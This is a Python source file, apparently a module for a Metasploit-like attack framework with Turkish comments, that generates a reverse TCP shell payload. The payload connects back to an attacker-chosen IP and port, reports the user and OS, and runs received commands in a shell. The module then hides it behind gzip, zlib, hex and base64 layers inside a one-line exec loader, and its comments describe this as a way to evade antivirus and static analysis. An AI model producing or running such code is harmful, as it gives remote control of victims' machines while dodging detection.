from rich import print
from typing import Dict, Any 
# spesifik tipler.
from core.module import BaseModule 
# ana modül sınıfı.
from core.option import Option 
# option tanımlama için.
import base64
# base64 encode docode.
import binascii
# encode decode için.
import zlib
# encode decode için.
import gzip
# encode decode için.
import io
# io kütüphanesi, temel olarak Giriş/Çıkış (I/O) kaynaklarını (dosyalar, bellek içi tamponlar, borular vb.) aynı soyutlama katmanı ve yöntemlerle (örneğin read(), write(), seek()) işlemek için bir araç kutusu sağlar.
import os
# işletim sistemi ile ilgili şeyler için.
import sys
# sistem üzerinde işlem yapmak için kullanılan sistem kütüphanesi.
import textwrap
class mahpreter_reverse_tcp_generate(BaseModule):
    """mahpreter reverse_tcp oluşturucusu

    Args:
        BaseModule (_type_): Ana modül sınıfı
    """
    Name = "mahpreter/reverse_tcp/generate"
    Description = "payloads/mahpreter/reverse_tp için bir payload oluşturucu."
    Author = "Mahmut P."
    Category = "payloads"
    def __init__(self):
        """init fonksiyon
        """
        super().__init__()
        self.Options = {
            "ip": Option("IP", None, True, "Payload'ın bağlanacağı sunucunun ip adresi."),
            "port": Option("PORT", 5000, True, "Payload'ın bağlanacağı sunucu portu."),
            "file-name": Option("NAME", "evil.py", True, "payload'ın oluşturulacağı dosyanın adı.")
        }
        for option_name, option_obj in self.Options.items():
            setattr(self, option_name, option_obj.value)
    def run(self, options: Dict[str, Any]):
        """modül çağrılınca çalışacak fonksiyon.
        Payload oluşturuacak

        Args:
            options (Dict[str, Any]): İşlenecek Option'lar
        """
        
        kodum = f"""
import socket
import subprocess
import os
import platform
import sys
import time
import base64
import struct

# Configuration
SERVER_IP = "{options.get("ip")}" 
PORT = {options.get("port")}

def get_system_info():
    "Gathers basic OS and User info."
    try:
        os_name = platform.system()
        user = os.getlogin()
        return platform.system() + " - " + os.getlogin()
    except:
        return "Unknown System"

def send_full_data(s, data):
    "Send full data with length prefix."
    data_bytes = data.encode('utf-8')
    encoded = base64.b64encode(data_bytes)
    length = len(encoded)
    s.send(struct.pack('!I', length) + encoded)

def recv_full_data(s):
    "Receive full data with length prefix."
    try:
        length_bytes = s.recv(4)
        if len(length_bytes) != 4:
            return None
        length = struct.unpack('!I', length_bytes)[0]
        data = b''
        while len(data) < length:
            packet = s.recv(length - len(data))
            if not packet:
                return None
            data += packet
        return base64.b64decode(data).decode('utf-8')
    except:
        return None

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, PORT))
            #print("[+] Connected to Server!")

            # 1. Send System Info immediately (base64 encoded with length)
            info = get_system_info()
            send_full_data(s, info)

            # 2. Command Loop
            while True:
                # Receive full encoded command
                command = recv_full_data(s)
                
                if command is None:
                    break # Connection closed by server
                
                if not command.strip():
                    continue
                

                # Handle 'cd' command specifically (because subprocess spawns new shell)
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        output = f"Changed directory to {os.getcwd()}"
                    except FileNotFoundError:
                        output = "Directory not found."
                else:
                    # Execute command
                    # shell=True allows using pipes and system specifics
                    try:
                        proc = subprocess.run(
                            command, 
                            shell=True, 
                            capture_output=True, 
                            text=True
                        )
                        output = proc.stdout + proc.stderr
                    except Exception as e:
                        output = str(e)

                # If output is empty, send a confirmation
                if not output:
                    output = "[+] Command Executed (No Output)"

                # Send full encoded output
                send_full_data(s, output)
            
            s.close()
            #print("[-] Session ended by server.")
            break

        except ConnectionRefusedError:
            #print("[!] Connection failed. Retrying in 5 seconds...")
            time.sleep(5)
        except KeyboardInterrupt:
            try:
                s.close()
            except:
                pass
            sys.exit(0)
        except Exception as e:
            break

connect_to_server()
        """
        kodum = textwrap.dedent(kodum).strip()
        def multi_encode(code_str: str) -> str:
            """Orijinal kodu 4 aşamada şifreler: Gzip -> Zlib -> Hex -> Base64

            Args:
                code (str): kaynak kod

            Returns:
                str: şifrelenmiş kod.
            """
            code_bytes = code_str.encode('utf-8')
            
            with io.BytesIO() as bio:
                with gzip.GzipFile(fileobj=bio, mode='wb') as gzf:
                    gzf.write(code_bytes)
                gzip_encoded = bio.getvalue()
            
            zlib_encoded = zlib.compress(gzip_encoded)

            hex_encoded = binascii.hexlify(zlib_encoded)

            base64_encoded = base64.b64encode(hex_encoded)

            final_encoded_str = base64_encoded.decode('utf-8')

            return final_encoded_str
        
        def create_single_line_decoder_file(encoded_data: str, filename: str = "runner.py") -> str:
            """Şifreli veriyi çözüp çalıştıran TEK SATIRLIK ve AV dirençli Python dosyasını oluşturur.

            Args:
                encoded_data (str): şifrelenmiş data
                filename (str, optional): İçine kod enjekte edilmiş çalışacak kod. Defaults to "runner.py".

            Returns:
                str: Dosya yolu
            """
            # 1. Tüm import'lar (sys ve os dahil)
            # 2. Şifreli veriyi bir değişkene atama (AV imzalarını dağıtır)
            # 3. 'exec' fonksiyonunu 'getattr' ile dinamik olarak çağırıp gizleme (Statik analizi atlatır)
    
            # NOT: Python'da birden fazla komut tek satırda ';' ile ayrılabilir.

            DECODER_CODE = f"""
import base64, binascii, zlib, gzip, io, sys, os; ENCODED_PAYLOAD='{encoded_data}'; RUNNER=getattr(__builtins__, "exec"); RUNNER(gzip.GzipFile(fileobj=io.BytesIO(zlib.decompress(binascii.unhexlify(base64.b64decode(ENCODED_PAYLOAD)))), mode='rb').read().decode('utf-8'), globals())
""".replace('\n', '').strip()
            
            try:
                with open(filename, 'w') as f:
                    f.write(DECODER_CODE)
                
                full_path = os.path.abspath(filename)
                return full_path
            
            except Exception as e:
                print(f"Dosya yazma hatası: {e}", file=sys.stderr)
                return ""

        sifrelenmis = multi_encode(kodum)
        full_path = create_single_line_decoder_file(sifrelenmis, str(options.get("file-name")))
        print("Payload bu dizine kaydedildi:")
        print(full_path)